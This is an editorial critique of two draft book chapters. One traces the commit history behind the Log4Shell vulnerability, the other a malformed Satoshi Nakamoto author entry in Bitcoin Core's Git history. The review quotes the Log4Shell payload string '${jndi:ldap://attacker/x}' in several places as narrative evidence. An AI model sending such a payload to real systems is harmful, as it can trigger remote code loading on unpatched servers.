# Craft review: Chapters 2 and 3

## Overall verdict

Chapter 2 has the right argument and the right evidence, but it currently *states* its governing idea more powerfully than it dramatizes it. The “no villain, competent people, compounding” thesis does land intellectually: the reader cannot miss it. What is not yet landing at full force is the experience of reaching that conclusion. The opening gives away the five-commit shape, the innocence of every actor, and the coral-reef metaphor before the first commit appears. Later, several headings and narrator verdicts again tell us how to judge the chain. The most important chapter in the book should make me approve each local decision and only then let me discover what my approvals have assembled.

Chapter 3 is in the right register for a palate-cleanser. It is wry rather than grave, humane toward Gavin, technically revealing without pretending that a typo is a catastrophe, and built around an object only Git could preserve. Its shortness is an asset. It needs a little more room at two explanatory joints, but doubling it to meet the nominal 2,200-word floor would turn a sharp anecdote into an overargued one. Treat it as an intentional interlude-length chapter, or add only 250–350 words that improve the dig and the usable habit.

The chapters also make a good pair. Chapter 2 says history can distribute causality until no commit looks guilty. Chapter 3 says history can preserve an obviously wrong identity even when everybody can see it. One is cumulative and frightening; the other is compact and absurd. That tonal change works.

## Chapter 2: “The verb that arrived late”

### Editorial diagnosis

The chapter’s material is excellent. In particular, the sequence from an operator-owned substitution language, to message interpolation, to an open-ended `jndi` verb, to dormant opt-outs, to the late default flip is a lucid account of how individually defensible changes compose into an indefensible system. The 2012 performance guard is the strongest hinge, and the 2021 commit message—“This feature is not used”—is an excellent echo: performance helps open the path and performance helps close it.

But the chapter presently spends its thesis in the first paragraph:

> “There is a version of the Log4Shell story where someone is careless. It is the version most people tell, and it is wrong. What `git` holds instead is worse and more useful: five commits, spread across eleven years, each of them the sort of thing you would approve without a second thought. Nobody was careless.”

That is a strong conclusion masquerading as an opening. It tells the reader the answer, the shape of the proof, and the required moral response. The rest of the chapter then illustrates a verdict already delivered. For this book’s reveal grammar, reverse the burden: let the first three commits look useful; let the 2016 complaint look like confirmation that the system is behaving as designed; let the reader notice that every safeguard is optional. Only after the chain is assembled should the narrator say, in effect, *I approved every link*.

So: yes, the “no villain” thesis lands, but too much as insistence and not enough as implication. It is also undercut in a few places by language that quietly creates an institutional culprit: “the off switch nobody flips,” “Log4j *saw* it,” “everyone looks straight at it,” and “An off switch whose default is on is not a mitigation. It is a comment.” Those are good prosecutorial lines. They are less good for a chapter whose distinction is that nobody had the global view. Replace judgment about the unflipped switch with the local reason the default remained compatible. The reader should feel the trap, not be told whom to resent.

### Structure and pacing

The chronological spine is clear, and the year headings keep a technically dense sequence navigable. The danger is that chronology becomes enumeration: 2010, 2012, 2013, 2016, 2017, 2021, December 4, December 13, January 2022. The opening promises “five commits,” but the reading surface presents more than five commit events without telling the reader which five constitute the causal chain and which are warnings, mitigations, or aftermath. That makes the central architecture feel fuzzier than the reporting actually is.

Make the five-link spine visible in the prose without turning it into a numbered list. Each primary link should change one thing in the reader’s mental model:

1. Text can contain instructions.
2. Application messages can reach those instructions.
3. The instruction set gains a network-capable verb with an open scheme.
4. The dangerous behavior becomes recognized enough to acquire opt-outs, but remains the default.
5. The default finally flips, after years of being unnecessary but universal.

Supporting commits—the 2016 precursor, the 2017 global switch, and the December repair sequence—can remain, but the narrator should distinguish “another link in the cause” from “evidence that the system exposed its own seam” and from “what it took to dismantle it.” At present, all commits receive roughly equal narrative billing.

The reveal sequence also explains too quickly. In 2012, the heading says “Here is the pivot” before the code appears. Then “Before this commit” and “After it” decode the change before the reader can. In 2013, the prose announces that the documentation is “the whole disaster in one sentence” before displaying why. These are exactly the moments where one beat of reader inference would pay off.

For the 2012 turn, show the subject and the ternary, identify `result` as the formatted message, then isolate the consequence:

> The template is no longer the only string that can become a program.

For the 2013 turn, show the safe default and the colon exception, name `java:`, and then give the reader the other schemes on a separate line. The payload `${jndi:ldap://attacker/x}` should stand alone after the three prior pieces have been recapped. The reader will recognize it a fraction before the narration says what it does.

The pace is strongest from the 2012 diff through “A performance guard and an attack trigger can be the same two lines of code.” It slows in “2016: the off switch nobody flips,” partly because two commits and three versions of the same moral occupy one section. Compress the repeated verdicts and use the space to reconstruct why an opt-in was a locally reasonable response to a compatibility complaint. That would advance the no-villain thesis rather than merely repeat the technical state.

“The fire” is simultaneously rushed and overfull. “The internet is on fire” is generic summary, while the section then spends its detail budget on two patches, plugin re-registration, a 2014 TODO, and a January 2022 resolution. The hard-coded exclusion is a valuable final callback to 2010’s open vocabulary. The TODO is a weaker second callback after that clean resolution. End the repair sequence on the fact that the original extensibility mechanism tries to restore the forbidden verb; either cut the TODO or move it into one sentence earlier as corroboration.

### The hardest-working and weakest paragraphs

The hardest-working paragraph begins:

> “Nobody is logging attacker input into it yet, because nobody has registered a dangerous verb.”

It does four jobs without fuss: keeps the 2012 actor inside the knowledge available in 2012, distinguishes exposure from exploitability, connects the open vocabulary to application input, and lands on the dual use of the performance guard. This is the chapter’s thesis in dramatic form. It does not need “Nobody was careless”; it demonstrates why the commit looked safe.

The weakest paragraph is the final one in “The fire”:

> “The tension was flagged in the code the whole time — a `// TODO: this ought to use the PluginManager` comment, added in 2014, still sitting there when the fire started, only resolved in January 2022.”

After the hard-coded FQCN has already completed the 2010 callback, the TODO opens a new thread, introduces another year, and then resolves it outside the main time frame. “The tension was flagged” also invites hindsight blame without explaining what the TODO’s author understood the tension to be. Cut it, or move it into the earlier account of open registration and make clear that it documents architecture, not foreknowledge of an exploit.

### Prose: concrete revisions

> “The vulnerability was assembled the way a coral reef is — one reasonable deposit at a time — and the log records every reasonable person who added to it.”

The image is good, but “reasonable” twice makes the author’s judgment conspicuous, and the whole line belongs after the evidence. Suggested later version: “The vulnerability did not arrive. It accreted: one useful layer at a time.”

> “It is a feature every logging framework has. It is also, quietly, a little programming language: a string containing `${` is no longer just text, it is an *instruction*, and the thing that reads the instruction walks a list of registered ‘lookups’ — `sys`, `env`, `date` — and dispatches on the prefix before the colon.”

This carries too many conceptual steps in one sentence, and “every logging framework” is a sweeping throat-clearer. Suggested rewrite: “Variable substitution looks like convenience. But the moment `${` changes the meaning of the characters after it, the configuration has acquired a small language. Its interpreter reads the prefix before the colon—`sys`, `env`, `date`—and dispatches to a registered lookup.”

> “Whatever anyone registers later becomes a word this little language can speak, in every config file, forever.”

“Forever” is melodramatic and technically distracts from the precise architectural point. Suggested rewrite: “A plugin registered later becomes a new verb everywhere the interpolator runs.”

> “Here is the pivot, and it is worth slowing down for, because it is the least suspicious commit in the entire chain and it is the one that turns a config feature into an attack surface.”

This tells the reader both the importance and the conclusion before the evidence. Suggested rewrite: “Two years later, the interpolator moves. The commit calls it a performance change.”

> “The second is from the *documentation*, checked in with the same commit, and it is the whole disaster in one sentence.”

Again, the narrator names the bomb before the reader examines it. Suggested rewrite: “The second line is documentation from the same commit. Read the exception after the comma.”

> “It has been, since this Thursday afternoon, and it will stay that way for eight years while everyone looks straight at it.”

The last clause implies collective negligence, at odds with the chapter’s governing argument. Suggested rewrite: “The path is complete on this Thursday afternoon. For eight years, it will present itself as three separate features.”

> “The most painful part of the record is that Log4j *saw* it. Not as a security hole — as a bug report about the wrong thing.”

The first sentence overclaims shared perception; the second contains the better insight. Suggested rewrite: “In 2016, the same behavior becomes visible from the other side—not as a security report, but as a compatibility bug.”

> “An off switch whose default is on is not a mitigation. It is a comment.”

The switch/default wording makes the reader stop to parse which thing is on, while “not a mitigation” judges a commit by knowledge the actor did not have. Suggested rewrite: “The code now contains an escape hatch. Existing applications have no reason to take it.”

> “Whether Carter is quietly acting on the private report or independently killing a misfeature the same week, the commit does the correct thing for a reason adjacent to the truth.”

This speculates about motive at the chapter’s most sensitive moment. Let Git’s limitation strengthen the narrator’s voice. Suggested rewrite: “Git fixes the sequence but not the motive: the author date follows the private report, while the message argues from usage and CPU. The record contains no sentence joining those facts.”

> “On December 9 the disclosure is public and the internet is on fire.”

This is stock catastrophe language in a chapter otherwise defined by precision. Suggested rewrite: “On December 9, a behavior that had looked like interpolation became an incident defenders had to locate inside their own applications.” Add concrete scale immediately after, once supported by the chapter’s existing source work.

### Expansion: where added material would earn its keep

At roughly 1,715 body words, this chapter should grow. It is the book’s thesis chapter, and the missing material is not another commit; it is connective tissue that lets a general reader experience the composition.

1. **Add 120–180 words after the 2010 section to walk one harmless string all the way through.** Put an operator-written `${sys:user.name}` beside an ordinary user-originated message. At this point they still travel on separate tracks. This gives the reader a stable before-state, so the 2012 move has somewhere visible to land.

2. **Add 120–160 words around the 2012 diff from the narrator’s archaeological point of view.** The book premise is an engineer running Git daily, but this chapter mostly presents a polished historical summary. Show the search move: a dangerous line whose commit subject says “performance,” the reason `-S 'contains("${")'` matters, and the moment the narrator notices that `result` is not the layout template. This puts the “I” back in the dig without adding autobiography.

3. **Add 100–150 words to the 2016/2017 room.** Reconstruct the local problem using only what the record supports: literal `${...}` disappears from a message; `%m{nolookups}` restores it; a global property later makes the choice easier. Explain why compatibility naturally favors an opt-in. This is the best place to make “competent people, local scope” felt rather than asserted.

4. **Add 150–250 words at the start of “The fire” to make the blast radius concrete.** The current draft jumps from eight quiet years to “the internet is on fire.” Give the reader two or three measurable dimensions already available to the project’s research—how long the path shipped, where defenders had to look for it, and why the first narrowing patch did not end the work. Do not add a catalog of victims; show the operational problem of discovering that an unused feature is present everywhere.

5. **Add a 70–100-word synthesis immediately before the public disclosure.** Recap the chain in the vocabulary each commit’s actor would have used: substitution, performance, enterprise lookup, compatibility, CPU. Then place the exploit string alone. The point is not to summarize for comprehension; it is to let five benign nouns produce the sixth, frightening one.

Those additions would bring the chapter near the lower band without padding. Do not expand the post-disclosure patch chronology further. The story is how the path formed, not a complete Log4Shell remediation history.

### Open and close

The cold open should begin on the 2012 diff, because chapter 1 enters on a clock and this chapter’s signature object is a harmless-looking conditional. For example, open with the two added lines and only this much orientation: “This is the line I would have approved. It skips work unless a message contains `${`.” Then go back to 2010 to explain what `${` meant before this commit. Do not mention Log4Shell, five commits, eleven years, or “Nobody was careless” until the reader has seen at least the 2013 colon. The title already promises that a verb is coming; the opening can promise a line whose meaning will change.

The current “At home” contains the correct transferable habit:

> “Grep for the *seam* — the commit that connected two safe things into one unsafe thing.”

That is the ending to protect. The section presently offers two takeaways: search boundary-crossing commits, and maintain a denylist for auto-discovered verbs. The second is good security design advice, but it is not the chapter’s distinctive Git habit and it takes the final word. End instead on the search behavior. A tighter closing movement would say that the dangerous commit may be filed under performance, then give `git log -S 'contains("${")'`, then broaden once: inspect commits that change *where* data is interpreted. The last sentence could be: “The seam I needed was filed under performance.” That closes on the repository’s disguise and on something the reader can do.

### Title

Keep **“The verb that arrived late.”** It is story-specific, compact, and only becomes fully legible after the 2013 section. It also casts the dangerous capability as an addition to an existing language, which supports the accretion thesis.

If the revision centers the 2012 hinge more strongly, **“To improve performance”** is the best alternative: innocent on first reading, ominous on return. **“The open vocabulary”** is precise but more textbook-like. Avoid “The five commits”; it advertises the scaffolding rather than the story.

### Single most important change for Chapter 2

Remove the thesis verdict from the opening and make the reader approve the local decisions before naming what they compose. The chapter should not begin with “Nobody was careless”; it should make that the only conclusion left by the time the exploit string appears.

## Chapter 3: “A flag with 8 commits”

### Editorial diagnosis

The chapter works as a lighter interlude. Its humor comes from Git’s literalness, not from mocking Gavin: “The man who will run Bitcoin Core for the next half-decade enters as a janitor” and “the flag-that-should-have-been-a-flag” are affectionate, memorable lines. The stakes are deliberately reputational and archaeological rather than bodily or infrastructural. That is exactly the right release of pressure after two security disasters.

The first reveal lands better than Chapter 2’s. The reader sees the malformed name in `shortlog`, has a beat to register that the third row is strange, and then receives the explanation. The deeper reveal—the same patch also exists with a clean `s_nakamoto` author—is even better material. Unfortunately, the prose announces it before showing it:

> “And here is the part that makes it a chapter instead of a bug report: the correct version exists.”

Remove the meta-commentary and let the clean commit appear first. Its matching subject line will let attentive readers feel the duplication before the narrator names it. Then isolate the real turn:

> The same change is in the history twice, under two different Satoshis.

That gives this short chapter a second gear and makes it more than an amusing `shortlog` result.

### Structure and pacing

The four-part movement is sound: odd name, handover context, malformed authorship, immutability. It does not need another subplot. “The handover” earns its space because it gives Gavin a competent, generous motive and makes the author/committer distinction matter. The first-commit `Fix CRLF` detail is characteristically mundane and suits the book’s interest in the ordinary work behind famous outcomes.

The middle explains the presumed command path twice: first “What Gavin typed,” then “Somewhere a quoting boundary landed one character off.” The repository output proves the author and committer fields; the prose should be equally explicit about where reconstruction begins. That is not a request to re-investigate the facts. It is a point-of-view improvement: the narrator is most trustworthy when saying exactly what Git can and cannot preserve. One concise sentence can do it: “The object preserves the result, not the keystrokes: the flag crossed the boundary from instruction to author text.”

“Why it is still there” is one paragraph too emphatic. The chain-of-hashes explanation is necessary, but this sentence reaches for a Bitcoin metaphor at the expense of clarity:

> “in a project where the entire security model rests on a chain of hashes that thousands of people have independently copied, you do not rewrite the chain to fix a cosmetic typo.”

It momentarily blurs the Git commit graph with Bitcoin’s ledger, then repeats the same idea through “load-bearing,” “immutability,” and “ledger” in the next two paragraphs. Explain descendant hashes once, keep “The mistake is load-bearing now” as the memorable compression, and move on.

### The hardest-working and weakest paragraphs

The hardest-working paragraph begins:

> “Every one of them has Gavin as the committer and the flag-that-should-have-been-a-flag as the author.”

The `fuller` output immediately beneath it turns an amusing name into a legible act of maintenance: Satoshi’s authorship is being preserved while Gavin applies the work. It proves the error and the good intention in the same object. That is exactly what this book is for.

The weakest paragraph begins:

> “The shell did what shells do. Somewhere a quoting boundary landed one character off...”

It is vivid, but it dramatizes keystrokes the displayed object cannot show, repeats the instruction/data distinction already established, and ends with the generic aphorism “git, which does not judge.” Replace it with one sentence distinguishing preserved result from inferred mechanism, then proceed to the duplicate clean commit.

### Prose: concrete revisions

> “The third has eight commits, and it is not a person. It is a command-line flag that a real, identifiable human typed by hand, sixteen years ago, and that `git` has been faithfully attributing to a contributor ever since.”

This reveal is slightly overpacked. Suggested rewrite, with whitespace doing the work: “The first two are forms of the pseudonym. The third has eight commits. / The third is not a person. It is a command-line option preserved as an author.”

> “This is the smallest story in the book and one of the truest.”

The book should not rank its own truth, and the following sentences already establish the lower stakes. Suggested rewrite: “Nothing was attacked. Nothing broke. Someone tried to preserve another person’s credit, and Git preserved the mistake instead.”

> “The man who will run Bitcoin Core for the next half-decade enters as a janitor, which is how maintainers almost always enter.”

The observation is good; “almost always” makes it sound canned. Suggested rewrite: “The man who will run Bitcoin Core for the next half-decade enters doing what maintainers do first: chores.”

> “What Gavin typed, though, put the literal text `--author=Satoshi Nakamoto <satoshin@gmx.com>` into the *author field itself* — the `--author=` and all.”

Suggested rewrite: “What the commit object contains is not just the name but the option itself: `--author=Satoshi Nakamoto <satoshin@gmx.com>`.” This keeps the evidence exact and leaves the unseen invocation offstage.

> “And here is the part that makes it a chapter instead of a bug report: the correct version exists.”

Suggested rewrite: cut it. Show the clean `s_nakamoto` commit first, then write: “Same subject, same change, same day. One line names Satoshi; the other names the instruction meant to name him.”

> “Same change, same day, done right.”

“Done right” is imprecise because the two histories and identities are the interesting fact, not a contest between implementations. Suggested rewrite: “Same change, same day, with a clean author field.”

> “The mistake is load-bearing now. It is cheaper to leave `--author=Satoshi Nakamoto` standing as a contributor forever than to touch the ledger it lives in.”

Keep the first sentence. Simplify the second: “Correcting the author would replace every descendant hash, so the visible error stays.”

> “A name in a git history is not metadata sitting beside the work — it *is* the work, cryptographically.”

The idea is right, but “is the work” overstates it. Suggested rewrite: “Authorship is not a label beside a commit. It is part of the data the commit hash covers.”

### Expansion: why short is right, and what is worth adding

At roughly 1,066 body words, this chapter is below the 2,200-word band. Keep the exception. The story has one comic anomaly, one human intention, one duplicate-patch turn, and one Git lesson. Stretching those materials to 2,200 words would require biography, Bitcoin history, or a general Git lecture, all of which would weaken its function as a palate-cleanser. If the length rule is truly non-negotiable, label this an interlude or pair it typographically with another short dig; do not pad it into compliance.

There are three additions that would earn 250–350 words total:

1. **After the correct `git commit --author=...` example, add 80–120 words on author versus committer.** Use the displayed `fuller` record as the teaching object: one field credits the patch, the other records who put it into this history. That distinction is the human heart of the handover and will help readers who have never applied someone else’s patch.

2. **At the duplicate-patch reveal, add 80–100 words that orient the two lines of history.** Do not add more Bitcoin background. Explain only why a patch can appear once through Gavin’s Git-side application and once through the imported SVN line, so “both are checked in” feels like an archaeological result rather than a magic trick.

3. **In “At home,” add an exact inspection command and 60–90 words of practice.** “Check what the shell actually handed to git” is good advice but not yet a habit the reader can execute. Give a one-commit command that prints author and committer separately, such as `git show --no-patch --format=fuller HEAD`, and tell the reader to run it after preserving somebody else’s authorship. This is the chapter’s equivalent of Chapter 2’s `git log -S` move.

One optional 50-word addition could restore more of the first-person narrator: after the `shortlog`, say what assumption the narrator usually makes about a contributor row and what the leading `--` does to that assumption. That would make the discovery feel performed rather than merely reported.

### Open and close

The cold open is strong and should remain command-first. It satisfies the “name” opening without repeating Chapter 1’s clock. Tighten the setup sentence—“Run `git shortlog` ... and the answer is not one row. It is three”—but keep the three-line output exactly where it is. Then slow the decoding: identify the first, identify the second, leave a blank line, and reveal the third. The reader has already noticed it; the narration should reward that notice.

The paragraph beginning “This is the smallest story in the book” is a second opening that summarizes the whole chapter after the real opening has already succeeded. Cut or compress it. Moving “Nobody was attacked. Nothing broke.” to the transition into “The handover” would mark the lighter register without giving away the full moral.

The close has an excellent final pair:

> “Sometimes it is a person. Sometimes it is a flag.”

Keep it. What precedes it should become more practical and less philosophical. The first “At home” paragraph repeats the immutability explanation from “Why it is still there.” Cut that repetition, insert the exact author/committer inspection command, and retain the warning not to infer identity from an old author string. The movement should be: perform generous attribution, inspect the object, distrust names as proof, final joke. That is both usable and tonally light.

### Title

Change the title. **“A flag with 8 commits”** gives away the joke before the command output and uses a numeral in a way that feels like a blog headline. The best replacement is **“The third Satoshi.”** It describes exactly what `shortlog` shows, preserves the question of what that third identity is, and acquires its joke only after the reveal.

Other workable options:

- **“Eight commits”** — clean and withholding, though less distinctive.
- **“The author field”** — accurate but flat.
- **“The flag that became a person”** — lively, but it spoils the opening reveal almost as much as the current title.

### Single most important change for Chapter 3

Make the clean duplicate commit the chapter’s deeper turn: stop announcing it with “the part that makes it a chapter,” show it first, and let the reader recognize the same patch under a second author before the narrator names the duplication.

## Top five changes across both chapters, ranked by impact

1. **Rebuild Chapter 2 so “no villain” is the reader’s conclusion, not the opening claim.** Cut the thesis-summary cold open, reduce verdict language, and make each local decision persuasive in its own terms before the exploit string assembles them.

2. **Clarify Chapter 2’s five-link causal spine.** Distinguish causal commits from warning signs and repair commits; give each link one precise change in the reader’s mental model. This will preserve slow accretion without making the chapter feel like a year-by-year changelog.

3. **Give Chapter 2’s two main reveals a beat of silence.** Do not label 2012 “the pivot” before the diff or call the colon sentence “the whole disaster” before explaining it. Let `result`, the colon, and finally `${jndi:ldap://attacker/x}` do the revealing.

4. **Turn Chapter 2’s generic “internet is on fire” passage into a concrete blast radius and reinstate the Git narrator.** Add operational scale before the repair chronology, and add the narrator’s `-S` discovery around the 2012 line. These are the expansions most worthy of the extra 500 or so words.

5. **Promote Chapter 3’s duplicate clean patch from supporting evidence to the second turn.** It transforms a malformed author joke into a story about parallel histories disagreeing permanently. Add only enough author/committer and branch orientation to make that turn fully legible; preserve the short form.

## The two changes that matter most

- **Chapter 2:** Withhold “Nobody was careless” until the evidence has made any other reading impossible.
- **Chapter 3:** Let the reader discover the same patch twice before explaining what the duplication means.
